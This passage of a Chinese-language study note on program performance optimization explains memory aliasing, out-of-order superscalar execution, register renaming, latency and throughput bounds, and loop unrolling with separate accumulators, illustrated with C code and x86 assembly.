class="number">16</span>,</span><br><span class="line">         <span class="number">32</span>,<span class="number">64</span>,<span class="number">128</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">double</span>* B = A+<span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">sum_rows1(A, B, <span class="number">3</span>);</span><br></pre></td></tr></table></figure><p>那么，第二参数 <code>B</code> 就是 <code>A</code> 的一部分的<strong>内存别名</strong>，也就是说，程序有两个指针指向一块内存地址，这样的话，在每次 <code>B[i] = 0</code> 后，就会改变 <code>A</code> 的内容，从而改变求和的值。因此编译器仍然不敢直接优化。</p><p>问题在于，我们知道这个函数的作用是数组列求和，我们不会传入两个内存别名。但是编译器不知道——因为要检查所有的 memory alias 开销也非常大，所以编译器默认程序中都存在内存别名。</p><p><strong>所以解决方法是</strong>，我们暗示编译器这里不会有内存别名导致循环中数组值的更改：<strong>在求和时不直接加到 <code>b</code> 中，而是以临时局部变量存储，求和循环结束后同一赋值给 <code>b</code></strong>，这样在一次求和循环中编译器就不会重复从内存读取信息了：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Sum rows is of n x n matrix a and store in vector b */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">sum_rows1</span><span class="params">(<span class="type">double</span>* a, <span class="type">double</span>* b, <span class="type">long</span> n)</span> &#123;</span><br><span class="line">    <span class="type">long</span> i, j;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">        <span class="type">double</span> val = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; n; j++)</span><br><span class="line">               val += a[i*n + j];</span><br><span class="line">        b[i] = val;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样内层求和循环的汇编码就变得简单了：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># sum_rows1 inner loop</span><br><span class="line">.L10:</span><br><span class="line">    addsd(%rdi), %xmm0# FP load + add</span><br><span class="line">    addq$8, %rdi</span><br><span class="line">    cmpq%rax, %rdi</span><br><span class="line">    jne.L10</span><br></pre></td></tr></table></figure><blockquote><p>实际上，内存读写仍然是耗时大头，所以改写后性能提升不会非常明显。</p></blockquote><p>对开发者而言，应该习惯于在循环前引入一些局部变量（<strong>Accumulate in temporary</strong>），尤其是含有数组索引的循环，这样能够暗示编译器按照没有内存别名的情况处理。</p><p>总结一下就是：</p><ul><li>多使用临时局部变量来存放中间值，尤其是在循环中；</li><li>使用更严格的关键字，例如 <code>int[]</code> 好过 <code>int*</code> 来让编译器知道不会有 memory alias；</li></ul><p>上面的几种优化技巧都是比较简单和零碎的，不宜死记硬背，应该贯通在实践当中。下面从另一个角度考虑优化问题。</p><h2 id="12-5-Machine-Dependent-Optimization"><a href="#12-5-Machine-Dependent-Optimization" class="headerlink" title="12.5 Machine-Dependent Optimization"></a>12.5 Machine-Dependent Optimization</h2><blockquote><p>这类优化取决于处理器机器和系统，根据汇编处理方式进行优化。</p></blockquote><p>表面上与机器无关的优化方法都考虑得差不多了，但在机器层面还有一些优化的方法。为了考虑这些方法，我们需要先了解机器的简单组成和基本运作原理。下面是上个世纪末的处理器的大概的设计样式：</p><p><img src="imgs/modern_CPU_design.png" height="400px"></p><p>底层机制过于复杂，一般人短时间内几乎不可能理解，所以这里仅仅浅浅介绍一下。</p><p>CPU 执行代码时，借助了多种方法和技术，构建了健全的硬件设施，使得其执行指令的速度远远快于一条一条读取执行的速度。其中一种技术被称为 “超标量乱序执行” 技术（super-scalar out of order execution），它的思路可以理解为：CPU 一次性读入大量机器指令，再将顺序的指令拆开，发现逻辑上某两句间不相互依赖，于是 CPU 可以不按顺序、尽可能多地同时执行这些代码。</p><blockquote><p>Superscalar（超标量）</p><ul><li>每个时钟周期执行多个操作；</li><li>指令级并行（CPU 自主发现指令间依赖关系，并行执行没有依赖关系的指令）；</li></ul><p>Out-of-order execution（乱序执行）</p><ul><li><strong>Instruction Control Unit (ICU)</strong>: Fetch / Decode / Write Back; <strong>Execution Unit (EU)</strong>: Execute / Memory;</li><li>Fetch Control: Branch Prediction（比 Y86-64 的更高级） + Speculative Execution;</li><li>Instruction Decode</li></ul></blockquote><p>指令的这种特性被称为 <strong>指令级并行性（instruction level parallelism）</strong>；</p><p>上图的 Instruction Control 展示了 CPU 如何从高速缓存中抓取指令，并放入运算单元的。<strong>注意，这里所有的操作都使用缓存和寄存器</strong>，因为其他储存介质（包括内存）都太慢了。</p><p>上面<strong>在一个时钟周期中处理、执行多条指令的处理器</strong>被称为 Super-scalar Processor，它们通常一次性获取一串指令流，并动态地进行调度和执行。它的好处是 <strong>充分利用了代码中的指令级并行性</strong>，所以大多数现代 CPU 都是超标量的，并且现代 CPU 的执行模型也几乎都是乱序执行的模型。</p><p>现代 CPU 的策略是乱序执行，固然非常复杂，比之前讨论过的按序执行的<strong>流水线（pipelining）</strong> 更复杂。</p><p>流水线的基本思想是，<strong>处理器将每个计算分解为一系列不同阶段，每个阶段都有一个专用硬件可以独立完成。于是，当一个计算阶段的硬件空闲下来时，就可以接受下一个数据的计算工作</strong>。</p><p>其中，除法运算无法被分解在流水线上进行，一次操作 3 ~ 30 个时钟周期，所以是一个昂贵的操作。</p><blockquote><p>这些并行性都是单个 CPU 的单核的并行性，不涉及多核并行。</p></blockquote><p>总的来说，在机器层面上，程序的优化上限有两点：</p><ol><li><p>Latency Bound: 当 一系列指令被执行时必须按照严格的顺序进行 时，也就是说后一条指令依赖前一条的结果，此时程序的性能会受到限制。<strong>这种瓶颈（data dependency）限制了指令级别的并行性</strong>（没有 Y86-64 的 data forwarding）；</p><blockquote><p>其计算方法就是，<strong>一条指令 / 操作 最原本的 latency 时延，与承载量无关</strong>；</p></blockquote></li><li><p>Throughout Bound：处理器的运算单元所能达到的最大承载量（computing capacity，通常与对应运算单元数目、运算单元种类有关），这也是程序性能的最终上界。</p></li></ol><hr><p>接下来，借助流水线的知识，我们再分析一下现代处理器内部各个模块是如何进行协作的，以便我们针对特定机器进行优化。</p><p>对于现代处理器，主要就分为以上的两个部分：Instruction Control Unit &amp; Execution Unit。其中  Instruction Control Unit 的主要结构如下：</p><p><img src="imgs/ICU.png" height="200px"></p><ul><li><p>对于 Fetch Control Logic，采用的技术就类似在流水线中介绍的 Branch Prediction + Speculative Execution；</p><blockquote><p>前者（branch mis-prediction）表示一种预测下一条指令位置的技术（是否选择分支的策略、预测目标分支的策略）；后者（speculative execution）表示在分支预测后，还没有确定是否正确就立即取出预测位置的指令进行执行。如果后面检查出现错误，则恢复到原先的状态；</p></blockquote></li><li><p>对于 Instruction Decoding Logic，它的工作就有些不一样。为了充分利用指令集并行资源，该逻辑块：</p><ul><li><p>将传入的指令数据继续分解为 primitive instructions，每个 primitive instruction 都存在更简单的算术、加载、存储的任务，例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">addq %rax, 8(%rdx)</span><br><span class="line">      |</span><br><span class="line">      v</span><br><span class="line">load 8(%rdx) -&gt; t1</span><br><span class="line">addq %rax, t1 -&gt; t2</span><br><span class="line">store t2, 8(%rdx)</span><br></pre></td></tr></table></figure><p>下一步，为了方便交给下面的 Execution Unit 进行并行运算，中间存在一个 <strong>寄存器重命名</strong> 的步骤（后面再描述具体原因），根据原本一条指令所对应的 primitive instructions 用到的临时寄存器，<strong>按使用依赖关系对版本进行编号</strong>，例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line">    .L25:         # Loop:</span><br><span class="line">    vmulsd (%rdx),%xmm0,%xmm0     # t *= data[i]</span><br><span class="line">    addq $8, %rdx         # Increment data+i</span><br><span class="line">    cmpq %rax,%rdx         # Comp to data+len</span><br><span class="line">    jne .L25         # if !=, goto Loop</span><br><span class="line">            |</span><br><span class="line">            v</span><br><span class="line">    load (%rdx.0)       -&gt; t.1</span><br><span class="line">    mulq t.1, %xmm0.0   -&gt; %xmm0.1</span><br><span class="line">    addq $8, %rdx.0     -&gt; %rdx.1</span><br><span class="line">    cmpq %rax, %rdx.1   -&gt; cc.1</span><br><span class="line">    jne-taken cc.1</span><br><span class="line"></span><br><span class="line">而 Execution Unit 部分的主要结构如下图所示：</span><br><span class="line"></span><br><span class="line">&lt;img src=&quot;imgs/EU.png&quot; height=&quot;200px&quot;&gt;</span><br><span class="line"></span><br><span class="line">我们发现这里存在很多单独的运算单元，可以从 ICU 部分接收更多指令（$\mu$ code，即上面的 primitive instructions），并行进行不同种类 $\mu$ code 的运算。</span><br><span class="line"></span><br><span class="line">Data Cache 是存放最近访问的 / 临时的数据的地方。遵循 Memory Hierarchy，支持 EU 运算单元的快速存取，稍晚些时候会根据情况向 ICU 的 register files  以及 memory 写入数据。</span><br><span class="line"></span><br><span class="line">此外，Branch 模块不是用来运算某个分支是否应该跳转，而是用来计算分支预测是否正确。若预测错误，则 Branch 会通知丢弃该分支中执行得到的所有数据（利用 ICU 中的 Retirement Unit 不允许错误数据写入，并通知 Data Cache 标记无效数据），否则保留数据并写入；</span><br><span class="line"></span><br><span class="line">同时，ICU 中的 Retirement Unit 跟踪当前过程所有正在执行的指令，确保数据存取符合 sequential 语义。大致逻辑如下：</span><br><span class="line"></span><br><span class="line">当一个指令被 decode，它的信息会被放入一个 FIFO 队列中，直到两种情况之一才会从队头出队：</span><br><span class="line"></span><br><span class="line">1. Retirement Unit 发现该指令的所有 primitive instructions 被执行完，并且所有涉及通向该指令的 branch prediction 都是正确的，这条指令才会被 “retired”，结果写入程序寄存器中；</span><br><span class="line">2. 如果 Retirement Unit 发现该指令途中某个 prediction 是错误的，那么这个指令会被 “flushed”，计算结果会被抛弃，不会写入寄存器中。</span><br><span class="line"></span><br><span class="line">&gt; 注：上图所描述的 “Arithmetic Operation” 单元是被特化来执行整型、浮点型的不同组合的运算的（就是说，这些单元能执行多种不同操作，例如既能整型运算又能浮点型运算）。这样不致于程序对硬件资源的利用率不好。</span><br><span class="line"></span><br><span class="line">那么，“乱序执行” 技术如何实现？很简单，在 ICU 的 Instruction Decode Logic 给出 $\mu$ code 后，由于 $\mu$ code 的临时寄存器只需要记住版本，可以随意选取，因此设计了一个类似任务队列的指派单元，将上面发出的 $\mu$ code 根据**当前 EU 硬件空余情况**分发下去执行。</span><br><span class="line"></span><br><span class="line">&lt;img src=&quot;imgs/ICU-dispatch.png&quot; height=&quot;200px&quot;&gt;</span><br><span class="line"></span><br><span class="line">**为了加速一条指令到另一条指令的结果传送，处理器引入了一个机制，就是提到的 “寄存器重命名”。这些信息被共享在 renaming table 中（如上图下方的一条长横线）。当运算单元接到 $\mu$ code 后，会立即进行运算（非依赖地并行），将寄存器名、版本号组成的 二元组 $(u,t)$ 写入这个列表中**。</span><br><span class="line"></span><br><span class="line">&gt; 注：这个表维护每个寄存器 $u$ 与更新的重命名版本标记 $t$ 之间的关系。</span><br><span class="line">&gt;</span><br><span class="line">&gt; &lt;u&gt;这个表只包含未 “退役” 的寄存器条目。如果指令在表中没找到某个寄存器，那么说明值在寄存器文件中&lt;/u&gt;，需要的指令这时才会向寄存器文件请求查找。</span><br><span class="line">&gt;</span><br><span class="line">&gt; 每当 Branch 确定了分支结果后，才会通知 retirement unit 将正确的分支上运行的结果写入寄存器。这个时候也会重整 renaming table；</span><br><span class="line"></span><br><span class="line">等待某个版本 $t$ 的指令可以在表中得到数据，这种方式就是一种形式的 “数据转发”（比 Y86-64 的 data forwarding 更快）。&lt;u&gt;通过这种机制，能让依赖前一操作的操作尽快开始，而不需要存入寄存器文件再读出来。&lt;/u&gt;</span><br><span class="line"></span><br><span class="line">&gt; 这个 renaming table 就避开了 Y86-64 中的 control hazard，即便 branch prediction 还没有验证、不能更改程序寄存器，也依然能临时存放一些计算好的数据。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">最后，为了定性分析其中的运算效率，我们定义：</span><br><span class="line"></span><br><span class="line">- Issue Time（发送时延）：一个 $\mu$ code 从 ICU 发向 EU 的一个运算单元后，下一条 $\mu$ code 被发送到同一运算单元的时间间隔（硬件限制）；</span><br><span class="line"></span><br><span class="line">- Latency（延迟）：在一个 $\mu$ code 被发送到指定运算单元后，该运算单元需要多长时间来运算；</span><br><span class="line"></span><br><span class="line">  &gt; latency 的计算与 capacity 无关，只与这个指令运算本身的时间有关。</span><br><span class="line"></span><br><span class="line">- Capacity（硬件承载量）：一个处理器对于某种运算，运算单元的数量。</span><br><span class="line"></span><br><span class="line">- Max Throughput（最大吞吐量）：$T=\dfrac&#123;Capacity&#125;&#123;Issue\space Time&#125;$；</span><br><span class="line"></span><br><span class="line">- Throughput Bound（吞吐量界限）：最大吞吐量的倒数，描述了 **执行一条指令在吞吐量的限制下，需要的时间界限**；</span><br><span class="line"></span><br><span class="line">- Latency Bound（延迟界限）：等于延迟本身。描述了 **顺序执行一条指令（就是延迟的限制下）的时间界限**。</span><br><span class="line"></span><br><span class="line">  &lt;img src=&quot;imgs/intel-instr-metrics.png&quot;&gt;</span><br><span class="line">  </span><br><span class="line">  &gt; 如上图，我们从 `Intel Core i7 Haswell` 处理器的指标可以发现，Add / Multi 在 Latency &gt;= 1 的情况下，仍然有 Issue Time = 1，说明内置了流水线技术。并且，可以通过 Latency 反推流水线有多少个 stages。</span><br><span class="line">  &gt;</span><br><span class="line">  &gt; 我们还发现，divider 没有内置流水线，因为 Issue Time = Latency Time，**这说明了一个除法运算不能被分割成多个 stages，必须等待前一个计算完成才能继续计算下一个**；</span><br><span class="line">  &gt;</span><br><span class="line">  &gt; 同时，不同种类的除法运算（如数据类型）耗时不同，相同点是耗时很长。</span><br><span class="line">  </span><br><span class="line">  &lt;img src=&quot;imgs/ops-CPE.png&quot;&gt;</span><br><span class="line">  </span><br><span class="line">  这个图的数据就是由上一个图的信息得到的。所有运算的 latency 对应上面硬件限制的 latency time；Throughput 则是由 Capacity / Issue Time 得到的。</span><br><span class="line">  </span><br><span class="line">  **但是，虽然整型加法有 4 个运算单元，但是 Throughput 只有 0.5，主要是因为处理器最多只有 2 个 load 单元**。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### 12.5.0 Data-Flow Representation: Machine-level Profiling</span><br><span class="line"></span><br><span class="line">在利用我们已有对于 Modern Processor 的认识来 tuning 程序前，我们还要掌握一种分析机器指令级运算效率的图：Data-Flow 图。</span><br><span class="line"></span><br><span class="line">**它展现了不同操作间数据的 dependency 是如何限制执行顺序，并形成关键路径的**。这个关键路径就是该组机器指令的执行时间下界。</span><br><span class="line"></span><br><span class="line">以一个结构体数据类型为例：</span><br><span class="line"></span><br><span class="line">```c</span><br><span class="line">/* data structure for vectors */</span><br><span class="line">/* we can use different declarations for data_t */</span><br><span class="line">typedef struct &#123;</span><br><span class="line">    size_t len;</span><br><span class="line">    data_t *data;</span><br><span class="line">&#125; vec;</span><br></pre></td></tr></table></figure></li></ul></li></ul><p>其中的一个函数是：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Retrieve vector element and store at val. */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">get_vec_element</span><span class="params">(vec* v, <span class="type">size_t</span>, idx, <span class="type">data_t</span>* val)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (idx &gt;= v-&gt;len) <span class="keyword">return</span> <span class="number">0</span>;    <span class="comment">/* Out of range. */</span></span><br><span class="line">    *val = v-&gt;data[idx];</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对这个函数进行<strong>基准测试（Benchmark Computation）</strong>：</p><ul><li><p>测试函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">combine4</span><span class="params">(vec* v, <span class="type">data_t</span>* dest)</span> &#123;</span><br><span class="line">    <span class="type">long</span> i;</span><br><span class="line">    <span class="type">long</span> length = v-&gt;len;        <span class="comment">/* 将可能重复计算的部分提出循环 */</span></span><br><span class="line">    <span class="type">data_t</span>* d = v-&gt;data;</span><br><span class="line">    <span class="type">data_t</span> t = IDENT;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; length; i++)    <span class="comment">/* 不使用额外的 procedure 来重复检查 v-&gt;len */</span></span><br><span class="line">        t = t OP d[i];</span><br><span class="line">    *dest = t;                    <span class="comment">/* 不直接在循环内给数组赋值，使用 local variable */</span></span><br><span class="line">&#125;                                <span class="comment">/* 暗示编译器没有 memory alias */</span></span><br></pre></td></tr></table></figure><p>我们将使用不同数据类型（<code>data_t</code> 分别是 <code>int</code>、<code>long</code>、<code>float</code>、<code>double</code>），针对不同运算和值（<code>OP</code> 分别是 <code>+</code>、<code>*</code>，<code>IDENT</code> 分别是 0、1）；</p></li><li><p>测试指标：<strong>CPE (Cycle Per Element)</strong></p><ul><li>Convenient way to express performance of program that operates on vectors or lists.</li><li><strong>在这里，CPE 就是一个时钟周期中的进行 <code>OP</code> 运算的次数，总时长指标 <code>T = CPE * n + Overhead</code></strong>（这里 overhead 就是 n = 0 时的基础开销）；</li><li>tips: 在检查代码性能时，不应该以真实时间做单位（例如 nanosecond），应该使用处理器内部时钟周期作为单位更有用。因为开发者无法控制处理器频率，但是可以控制并衡量操作的时钟周期。</li></ul></li></ul><p>生成的机器指令如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.L25:                                 # Loop:</span><br><span class="line">    vmulsd (%rdx), %xmm0, %xmm0# Multiply acc by data[i]</span><br><span class="line">    addq $8, %rdx # Increment data+i</span><br><span class="line">    cmpq%rax, %rdx # Compare to data+length</span><br><span class="line">    jne.L25 # If !=, goto Loop</span><br></pre></td></tr></table></figure><p>其对应的 primitive instructions 及 data-flow diagram 如下：</p><p><img src="imgs/data-flow-example.png"></p><p>我们能将这个 loop 中使用到的寄存器进行分类：</p><ul><li>read-only：只作为这个 iteration 的源值，例如这里是 <code>%rax</code>；</li><li>write-only：只作为这个 iteration 的目的地，这里没有；</li><li>local：这个 iteration 内部使用的寄存器（运算单元随取随用），比如这里的 <code>CC</code>；</li><li>loop：既作为这个 iteration 的写目的地，又作为下个 iteration 的源值，例如这里的 <code>%rdx</code>、<code>%xmm0</code>；</li></ul><p><strong>我们发现，<u>loop 类寄存器的操作链决定了这个 data-flow 的关键路径</u></strong>（因为循环不依赖的寄存器可以并在其他步骤同时执行）。</p><p>由此可以将 loop 类寄存器涉及的路径抽取出，根据依赖关系画出新的 data-flow：</p><p><img src="imgs/data-flow-example-critical.png" height="400px"></p><p>结合实验数据可知，这条链就是限制程序性能的关键。</p><p>现在我们尝试一些措施将循环 “展开”（unrolling loop），例如每个循环进行两个数组操作：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">combine5</span><span class="params">(vec* v, <span class="type">data_t</span>* dest)</span> &#123;</span><br><span class="line">    <span class="type">long</span> i;</span><br><span class="line">    <span class="type">long</span> length = v-&gt;len;</span><br><span class="line">    <span class="type">long</span> limit = length - <span class="number">1</span>;</span><br><span class="line">    <span class="type">data_t</span>* d = v-&gt;data;</span><br><span class="line">    <span class="type">data_t</span> t = IDENT;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; limit; i+=<span class="number">2</span>)</span><br><span class="line">        t = (t OP d[i]) OP d[i+<span class="number">1</span>];        <span class="comment">/* Loop Unrolling (2x1). */</span></span><br><span class="line">    *dest = t;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现性能结果更加接近 Latency Bound：</p><p><img src="imgs/comb5.png"></p><p>分析编译器生成的汇编代码可知，原来在一个周期中的两条运算指令的 Load 被提到前面的位置上，相当于右图：</p><p><img src="imgs/comb5-explain.png" width="450px"><img src="imgs/seq1.png" width="350px"></p><p>由于这些乘法运算仍然前后依赖，所以尽管我们进行 unrolling loop 来减小每个 iteration 造成的开销，仍然无法超过 latency bound。</p><p>那么，如果我们使用 <strong>多个循环累计变量</strong>（Separate Accumulator，奇偶元素分开计算，最后合并），就能手动提高并行性：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">combine6</span><span class="params">(vec* v, <span class="type">data_t</span>* dest)</span> &#123;</span><br><span class="line">    <span class="type">long</span> i;</span><br><span class="line">    <span class="type">long</span> length = v-&gt;len;</span><br><span class="line">    <span class="type">long</span> limit = length - <span class="number">1</span>;</span><br><span class="line">    <span class="type">data_t</span>* d = v-&gt;data;</span><br><span class="line">    <span class="type">data_t</span> x0 = IDENT;</span><br><span class="line">    <span class="type">data_t</span> x1 = IDENT;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* Combine 2 elements at a time. */</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; limit; i+=<span class="number">2</span>) &#123;</span><br><span class="line">        x0 = x0 OP d[i];</span><br><span class="line">        x1 = x1 OP d[i + <span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* Finish any remaining elements. */</span></span><br><span class="line">    <span class="keyword">for</span> (; i &lt; length; i++)</span><br><span class="line">        x0 = x0 OP d[i];</span><br><span class="line">    *dest = x0 OP x1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再次绘制 data-flow 图会发现，关键路径变为 2 条，意味着关键路径长度被缩短，解释如右图：</p><p><img src="imgs/comb6-explain.png" width="450px"><img src="imgs/seq3.png" width="350px"></p><p>再换一种方法，如果我们更换运算结合的顺序（被称为 <strong>Re-association Transformation</strong>）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">combine7</span><span class="params">(vec* v, <span class="type">data_t</span>* dest)</span> &#123;</span><br><span class="line">    <span class="type">long</span> i;</span><br><span class="line">    <span class="type">long</span> length = v-&gt;len;</span><br><span class="line">    <span class="type">long</span> limit = length - <span class="number">1</span>;</span><br><span class="line">    <span class="type">data_t</span>* d = v-&gt;data;</span><br><span class="line">    <span class="type">data_t</span> t = IDENT;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; limit; i+=<span class="number">2</span>)</span><br><span class="line">        t = t OP (d[i] OP d[i+<span class="number">1</span>]);        <span class="comment">/* re-association */</span></span><br><span class="line">    *dest = t;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们也能发现，两条乘法指令的依赖关系改变了：每两条乘法指令只有一条在关键路径上：</p><p><img src="imgs/comb7-explain.png" width="450px"><img src="imgs/seq2.png" width=350px></p><p>这两种方式（separate accumulator、re-association）都能大幅度缩短关键路径，让程序性能突破 latency 瓶颈，接近吞吐量：</p><p><img src="imgs/combs-comp.png"></p><p>如果 separate accumulator 展开 10 次，就能更大限度利用机器资源。</p><p>但是，无论是 unrolling loop，还是 separate accumulator，都有一个界限：register spilling（寄存器溢出）。如果中间步骤展开过多，超过了已有寄存器数量，<strong>这时处理器会用内存来代替，反而会降低运行效率</strong>。</p><p>此外，之前我们提到了尽管整数加法有 4 个器件，但 throughput 不会超过 0.5，是因为 load/store 的约束。而我们之前看到的例子中，load 似乎不在关键路径上（因为之前的 load 只依赖于索引 i）。其实，load/store 操作也会和之前的 multiply 一样成为某些程序的关键路径，例如链表程序：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">ELE</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ELE</span> *<span class="title">next</span>;</span></span><br><span class="line">    <span class="type">long</span> data;</span><br><span class="line">&#125; list_ele, *list_ptr;</span><br><span class="line"></span><br><span class="line"><span class="type">long</span> <span class="title function_">list_len</span><span class="params">(list_ptr ls)</span> &#123;</span><br><span class="line">    <span class="type">long</span> len = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (ls) &#123;</span><br><span class="line">        len++;</span><br><span class="line">        ls = ls-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> len;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>汇编：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.L3:</span><br><span class="line">    addq$1, %rax</span><br><span class="line">    movq(%rdi), %rdi</span><br><span class="line">    testq%rdi, %rdi</span><br><span class="line">    jne.L3</span><br></pre></td></tr></table></figure><p>这个时候加载的结果决定下一条操作的地址时，load 指令（<code>movq</code> 的其中一个 $\mu$ code）就是关键路径上的一环了。我们发现这种循环的 CPE 约 4.00，说明：<u><strong>load 的 latency 约 4.00</strong></u>。</p><p>除了 load，store 也会成为关键路径的一环。来看两个例子：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span 